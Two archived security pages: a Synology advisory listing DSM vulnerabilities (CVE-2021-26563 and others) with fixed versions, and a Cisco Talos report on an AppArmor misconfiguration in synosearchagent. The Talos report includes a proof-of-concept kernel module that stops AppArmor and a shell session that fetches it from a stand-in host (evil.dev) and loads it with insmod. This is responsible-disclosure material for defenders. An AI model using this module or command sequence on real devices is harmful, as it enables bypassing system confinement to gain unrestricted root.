=== Content from www.synology.com_6bbf6061_20250114_220839.html ===


* [Security Advisory](security/advisory)
# Synology-SA-21:03 DSM

Publish Time: 2021-02-23 09:15:43 UTC+8

Last Updated: 2022-07-28 14:30:58 UTC+8

Severity
Important

Status
Accepted

**Abstract**

Multiple vulnerabilities allow remote attackers to obtain sensitive information or local users to execute arbitrary code via a susceptible version of DiskStation Manager (DSM).

**Affected Products**

| Product | Severity | Fixed Release Availability |
| --- | --- | --- |
| DSM 6.2 | Important | Upgrade to 6.2.4-25553 or above. |
| DSMUC 3.0 | Moderate | Pending |
| VS Firmware 2.3 | Not affected | N/A |

**Mitigation**

None

**Detail**

* CVE-2021-26563

  + Severity: Important
  + CVSS3 Base Score: 8.2
  + CVSS3 Vector: [CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)
  + Incorrect authorization vulnerability in synoagentregisterd in Synology DiskStation Manager (DSM) before 6.2.4-25553 allows local users to execute arbitrary code via unspecified vectors.
* CVE-2021-29088

  + Severity: Important
  + CVSS3 Base Score: 7.8
  + CVSS3 Vector: [CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
  + Improper limitation of a pathname to a restricted directory ('Path Traversal') in cgi component in Synology DiskStation Manager (DSM) before 6.2.4-25553 allows local users to execute arbitrary code via unspecified vectors.
* CVE-2022-22684

  + Severity: Important
  + CVSS3 Base Score: 7.2
  + CVSS3 Vector: [CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/MAV:L](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/MAV:L)
  + Improper neutralization of special elements used in an OS command ('OS Command Injection') vulnerability in task management component in Synology DiskStation Manager (DSM) before 6.2.4-25553 allows remote attackers to execute arbitrary commands via unspecified vectors.
* CVE-2021-33182

  + Severity: Moderate
  + CVSS3 Base Score: 5.0
  + CVSS3 Vector: [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N)
  + Improper limitation of a pathname to a restricted directory ('Path Traversal') vulnerability in PDF Viewer component in Synology DiskStation Manager (DSM) before 6.2.4-25553 allows remote authenticated users to read limited files via unspecified vectors.

**Acknowledgement**

* Claudio Bozzato of Cisco Talos
* Bing-Jhong Jheng
* Qian Chen (@cq674350529) from Codesafe Team of Legendsec at Qi'anxin Group

**Revision**

| Revision | Date | Description |
| --- | --- | --- |
| 1 | 2021-02-23 | Initial public release. |
| 2 | 2021-06-10 | Disclosed vulnerability details. |
| 3 | 2022-07-28 | Disclosed vulnerability details. |

## What can we do for you?

[![NAS Selector icon](img/footer/2019/footer_icon_nas_selector_home.png)

NAS Selector](support/nas_selector "Navigate to NAS Selector in homepage")

[![RAID Calculator icon](img/footer/2019/footer_icon_raid_calculator_home.png)

RAID Calculator](support/RAID_calculator "Navigate to RAID Calculator in homepage")

[![NVR Selector icon](img/footer/2019/footer_icon_nvr_selector_home.png)

NVR Selector](support/nvr_selector "Navigate to NVR Selector in homepage")

[![Knowledge Center icon](img/footer/2019/footer_icon_knowledge_base_home.png)

Knowledge Center](https://kb.synology.com/en-global/ "Navigate to Knowledge Center in homepage")

[![Downloads icon](img/footer/2019/footer_icon_downloads_home.png)

Downloads](support/download "Navigate to Downloads in homepage")

[![Newsletter icon](img/footer/2019/footer_icon_newsletter_home.png)

Newsletter](/subscribe-newsletter "Navigate to Newsletter in homepage")

[![NAS Selector icon](img/footer/2019/footer_icon_nas_selector.png)

NAS Selector](support/nas_selector "Navigate to NAS Selector")

[![RAID Calculator icon](img/footer/2019/footer_icon_raid_calculator.png)

RAID Calculator](support/RAID_calculator "Navigate to RAID Calculator")

[![NVR Selector icon](img/footer/2019/footer_icon_nvr_selector.png)

NVR Selector](support/nvr_selector "Navigate to NVR Selector")

[![Knowledge Center icon](img/footer/2019/footer_icon_knowledge_base.png)

Knowledge Center](https://kb.synology.com/en-global/ "Navigate to Knowledge Center")

[![Downloads icon](img/footer/2019/footer_icon_downloads.png)

Downloads](support/download "Navigate to Downloads")

[![Newsletter icon](img/footer/2019/footer_icon_newsletter.png)

Newsletter](/subscribe-newsletter "Navigate to Newsletter")

Company

* [About Synology](company)
* [Blog](https://blog.synology.com/)
* [Newsroom](company/news)
* [Media Coverage](company/reviews)
* [Customer Stories](company/case_study)
* [Office Locations](company/office_location)

Sales

* [Where to Buy](wheretobuy)
* [Contact Us](company/contact_us)
* [Become a Partner](/form/inquiry/sales)

Compatibility

* [HDD/SSD](compatibility?search_by=drives)
* [IP Cameras](compatibility/camera)
* [Network Cards](compatibility?search_by=category&category=network_interface_cards&p=1)
* [I/O Modules, IP Speakers, Access Controllers](compatibility/surveillance_devices)
* [Other Devices](compatibility?search_by=category)

Resources

* [Products A-Z](products-a-z)
* [Beta Program](beta)
* [Bounty Program](security/bounty_program)
* [Community](https://community.synology.com/enu)
* [Events](https://event.synology.com/en-global)
* [Subscribe to Newsletter](/subscribe-newsletter)

Copyright © 2025 Synology Inc. All rights reserved.
[Terms & Conditions](company/legal/terms_conditions "Terms & Conditions")
| [Privacy](company/legal/privacy "Privacy")
| Cookie Preference

 Global - English

Continue



=== Content from www.talosintelligence.com_5ff8fdae_20250114_220840.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

×

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2020-1158

## Synology DSM AppArmor synosearchagent misconfiguration vulnerability

##### April 19, 2020

##### CVE Number

CVE-2021-26563

### Summary

A misconfiguration exists in AppArmor’s synosearchagent profile of Synology DSM 6.2.3 25426 DS120j. A specially crafted kernel module can be loaded, leading to a bypass of AppArmor’s restrictions. An attacker can use insmod to trigger this vulnerability.

### Tested Versions

Synology DSM 6.2.3 25426-2 DS120j

### Product URLs

<https://www.synology.com/en-global/dsm>

### CVSSv3 Score

6.7 - CVSS:3.0/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

### CWE

CWE-284 - Improper Access Control

### Details

Synology DiskStation Manager (DSM) is the Linux-based operating system for every Synology NAS.

Synology DSM uses AppArmor to restrict applications’ capabilities within their OS.

The majority of the services in DSM are running as UID 0 (root):

```
# ps -o pid,user,ucmd -U 0|grep -e syno -e nginx
2644 root     synologaccd
2745 root     synoconfd
2754 root     synonetd
3651 root     synologrotated
4873 root     synologand
4876 root     synocrond
4975 root     synostoraged
4977 root     synostoraged
4980 root     synostoraged
5229 root     synobackupd
6606 root     synoscgi_______
6630 root     synosnmpcd
6651 root     synocgid
6659 root     synoagentregist
6923 system   synoscgi_______
6925 system   synoscgi_______
6926 system   synoscgi_______
6927 system   synoscgi_______
6930 system   synoscgi_______
7050 root     nginx
7692 root     synodisklatency
7714 root     synorelayd
8443 root     synoelasticd

```

Since these services are restricted via AppArmor, it is interesting to analyze their profile:

```
# aa-status
apparmor module is loaded.
139 profiles are loaded.
132 profiles are in enforce mode.
   /usr/bin/httpd
   /usr/bin/ldapsearch
   /usr/bin/nginx
   /usr/sbin/avahi-daemon
   /usr/sbin/dhclient
   /usr/sbin/dmidecode
   /usr/sbin/idmapd
   /usr/sbin/mountd
   /usr/sbin/rpcbind
   /usr/sbin/statd
   ...
10 processes are in enforce mode.
   /usr/sbin/avahi-daemon (8340)
   /usr/sbin/dhclient (4544)
   /usr/sbin/dhclient (4670)
   /usr/syno/bin/synosearchagent (6520)      [1]
   /usr/syno/sbin/synoscgi (6438)
   /usr/syno/sbin/synoscgi (6891)
   /usr/syno/sbin/synoscgi (6895)
   /usr/syno/sbin/synoscgi (6896)
   /usr/syno/sbin/synoscgi (6897)
   /usr/syno/sbin/synoscgi (6898)
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.

```

One of the confined processes is `synosearchagent` [1], which was the subject of a previous issue described in TALOS-2020-1159

Unfortunately, if we want to check the profile assigned to this binary, we’re left with just the `cache` entry, which is a compiled version of the profile:

```
# grep -r synosearchagent /etc/apparmor.d
Binary file /etc/apparmor.d/cache/usr.syno.bin.synosearchagent matches
/etc/apparmor.d/abstractions/synoscgi:/usr/syno/bin/synosearchagent                                                    px,

```

The binary profiles are sent directly to the AppArmor kernel interface, and lack a notable amount of information compared to the original plaintext profile. As it was discussed in an [https://gitlab.com/apparmor/apparmor/-/issues/57](AppArmor%20issue), a decompilation tool is not publicly available and would require a considerable effort to implement. For this reason, we analyzed the profile manually, by executing a shell that runs with the same restrictions imposed by `synosearchagent` (this is equivalent to being able to execute code as `synosearchagent`, as demonstrated in TALOS-2020-1159):

```
# cd /usr/syno/bin
# mv synosearchagent synosearchagent.orig
# cp /bin/bash synosearchagent
# ./synosearchagent
synosearchagent-4.3# id
uid=0(root) gid=0(root) groups=0(root),2(daemon),19(log)
synosearchagent-4.3# ls /
ls: cannot open directory /: Permission denied
synosearchagent-4.3# dmesg | tail -n 1
[27081.032234] audit: type=1400 audit(1601068479.296:634): apparmor="DENIED" operation="open" profile="/usr/syno/bin/synosearchagent" name="/" pid=25225 comm="ls" requested_mask="r" denied_mask="r" fsuid=0 ouid=0

```

As we can see, opening the root directory is restricted by the AppArmor profile.

However, we found that the profile allows for loading and removing kernel modules, for example by running `insmod`:

```
synosearchagent-4.3# lsmod|grep hfsplus
synosearchagent-4.3# insmod /usr/lib/modules/hfsplus.ko
synosearchagent-4.3# lsmod|grep hfsplus
hfsplus               100863  0

```

This is equivalent to having kernel code execution, hence it’s possible to disable AppArmor and bypass all the restrictions imposed by the profile.

Thus, an attacker able to execute code as root in `synosearchagent` (for example by exploiting TALOS-2020-1159) can then use the issue described in this advisory to gain unrestricted root privileges in DSM.

### Exploit Proof of Concept

The following proof-of-concept shows how to disable AppArmor in DSM from a restricted `synosearchagent` profile:

An attacker could compile the following module (“aastop.ko”) that executes `apparmor.sh stop`, which is a startup script that can be used to manage AppArmor.

```
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kmod.h>

int init_module(void) {
  char * envp[] = { "HOME=/", NULL };
  char * argv[] = { "/bin/bash", "/usr/syno/etc.defaults/rc.sysv/apparmor.sh", "stop", NULL };
  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
  printk(KERN_INFO "Executed.\n");
  return 0;
}

```

Next the attacker can download and insert the module (assuming it’s running code in the `synosearchagent` process:

```
synosearchagent-4.3# ls /                                                  [1]
ls: cannot open directory /: Permission denied
synosearchagent-4.3# wget http://evil.dev/aastop.ko -O /tmp/aastop.ko
synosearchagent-4.3# insmod /tmp/aastop.ko
synosearchagent-4.3# dmesg|tail -n1
[27363.832373] Executed.
synosearchagent-4.3# ls /                                                  [2]
bin dev  etc.defaults  lib    lib64       mnt   root  sbin  tmp  usr  var.defaults
config  etc  initrd    lib32  lost+found  proc  run   sys   tmpRoot  var  volume1
synosearchagent-4.3# aa-status
apparmor module is loaded.
0 profiles are loaded.
0 profiles are in enforce mode.
0 profiles are in complain mode.
0 processes have profiles defined.
0 processes are in enforce mode.
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.

```

As we can see the we now have permission to access the root directory and all AppArmor profiles have been unloaded.

### Timeline

2020-09-29 - Vendor Disclosure

2021-02-25 - Vendor Patched

##### Credit

Discovered by Claudio Bozzato and Lilith >\_> of Cisco Talos.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2020-1218](/vulnerability_reports/TALOS-2020-1218) [Previous Report

TALOS-2020-1012](/vulnerability_reports/TALOS-2020-1012)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)


